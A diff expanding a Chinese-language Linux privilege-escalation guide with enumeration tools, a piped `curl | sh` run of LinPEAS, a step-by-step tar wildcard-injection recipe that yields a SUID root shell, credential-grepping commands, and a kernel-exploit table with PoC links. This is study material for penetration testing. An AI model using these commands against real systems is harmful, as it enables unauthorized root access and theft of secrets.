@@ -57,7 +57,42 @@ cat ~/.bash_history
 grep -Rni "password\\|passwd\\|token\\|secret" /var/www /home /opt 2>/dev/null
 ```
 
-## 0x04 常见提权方向
+## 0x04 自动化枚举工具
+
+### 1. LinPEAS
+
+全量枚举 SUID、Capability、计划任务、可写路径、凭证残留，输出红/绿标注风险等级（红色=高危）：
+
+```bash
+# 不落地，内存中直接执行
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# 或本地运行
+./linpeas.sh -a
+```
+
+### 2. linux-exploit-suggester
+
+按内核版本匹配公开提权 EXP，弥补手工记 CVE 的遗漏：
+
+```bash
+# https://github.com/jondonas/linux-exploit-suggester-2
+./linux-exploit-suggester-2
+# 或指定内核版本
+./linux-exploit-suggester-2 -k 4.4.0
+```
+
+### 3. pspy
+
+无需 root、不注入任何依赖，直接监控进程与 cron 触发，抓 root 定时任务执行的完整命令行与脚本路径：
+
+```bash
+# https://github.com/DominicBreuker/pspy
+./pspy64 -pf -i 1000
+```
+
+典型用法：低权限挂上 pspy 等待 root 计划任务跑起来，观察它调用了哪个可写脚本，再针对性篡改。
+
+## 0x05 常见提权方向
 
 ### 1. `sudo` 配置错误
 
@@ -119,6 +154,22 @@ cat /etc/crontab
 - 调用命令是否使用相对路径。
 - 是否存在 `tar *`、`rsync *` 这类通配符注入场景。
 
+#### 通配符注入示例（tar）
+
+root 的 cron 里若有 `tar czf /tmp/backup.tar.gz *` 这类在可写目录执行的命令，可借 tar 的 checkpoint 参数注入命令：
+
+```bash
+# 1. 写入要执行的命令
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/exploit.sh
+chmod +x /tmp/exploit.sh
+
+# 2. 在同一目录创建两个“参数文件”，* 展开后 tar 会把它们当命令行参数解析
+touch /tmp/--checkpoint=1
+touch '/tmp/--checkpoint-action=exec=sh /tmp/exploit.sh'
+```
+
+原理：`*` 展开成文件名后，tar 把 `--checkpoint=1` 与 `--checkpoint-action=exec=sh /tmp/exploit.sh` 当作参数解析，到达 checkpoint 时执行 exploit.sh；产出的 `/tmp/bash` 带 SUID 位，执行 `/tmp/bash -p` 即为 root。
+
 ### 5. 服务文件与 PATH 污染
 
 查看 root 启动的服务脚本是否可写，或者是否调用未指定绝对路径的命令。
@@ -147,7 +198,7 @@ docker ps
 
 检查共享目录是否启用了危险配置，例如 `no_root_squash`。这类问题常见于内网横向环境。
 
-## 0x05 内核漏洞利用前的检查
+## 0x06 内核漏洞利用前的检查
 
 只有在配置类提权无果时，再考虑内核漏洞。先确认：
 
@@ -158,7 +209,28 @@ docker ps
 
 建议先做只读判断，不要上来就执行高风险 EXP。
 
-## 0x06 排查顺序建议
+## 0x07 经典内核漏洞清单
+
+| CVE | 别名 | 影响版本 | 一句话利用 |
+| ---- | ---- | ---- | ---- |
+| CVE-2016-5195 | DirtyCow | 2.6.22 – 4.8.3 | COW 竞态写任意只读文件，覆写 /etc/passwd 或 SUID 程序提权 |
+| CVE-2022-0847 | DirtyPipe | 5.8 – 5.16.11 | 管道缓冲区标志未清零，任意写只读文件（劫持 SUID 二进制起 root shell） |
+| CVE-2019-7304 | DirtySock | snapd < 2.37 | snapd REST API UNIX socket 权限缺陷，可创建本地 root 用户 |
+| CVE-2021-4034 | PwnKit | polkit pkexec（几乎所有发行版） | pkexec 环境变量注入（GCONV_PATH），直接获得 root shell |
+| CVE-2017-1000112 | UFO | < 4.13.5 | UFO 队列内存损坏，篡改 skb 执行任意代码提权 |
+| CVE-2010-3904 | RDS | 2.6.30 – 2.6.36 | RDS 协议套接字栈溢出，本地直接 root |
+| CVE-2023-0386 | OverlayFS | 5.11 – 6.2 | OverlayFS 复制 SUID/cap 文件时丢失权限校验，配合 FUSE 拿 root |
+
+POC 来源：
+
+- DirtyCow: https://github.com/FireFart/dirtycow （覆写 /etc/passwd 注入 firefart 用户）
+- DirtyPipe: https://dirtypipe.cm4all.com/ （官方分析与 PoC；SUID 劫持版可搜 blasty 的 dirtypipez.c）
+- DirtySock: https://github.com/initstring/dirty_sock
+- PwnKit: https://github.com/arthepsy/CVE-2021-4034 （Qualys 原始分析: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt）
+- OverlayFS CVE-2023-0386: https://github.com/xkaneiki/CVE-2023-0386
+- UFO / RDS 等老漏洞利用代码收录: https://github.com/SecWiki/linux-kernel-exploits
+
+## 0x08 排查顺序建议
 
 1. `id` / `sudo -l` / `uname -a`
 2. SUID / Capability / 定时任务
@@ -167,7 +239,7 @@ docker ps
 5. Docker / NFS / 容器环境
 6. 最后才是内核漏洞
 
-## 0x07 注意事项
+## 0x09 注意事项
 
 - 优先找配置错误，成本低、稳定性高、噪声小。
 - 提权前先留好当前会话和回连方式，避免把唯一入口打挂。
@@ -178,3 +250,4 @@ docker ps
 - https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 - https://gtfobins.github.io/
 - https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html
+- https://github.com/peass-ng/PEASS-ng （LinPEAS / WinPEAS 官方仓库）
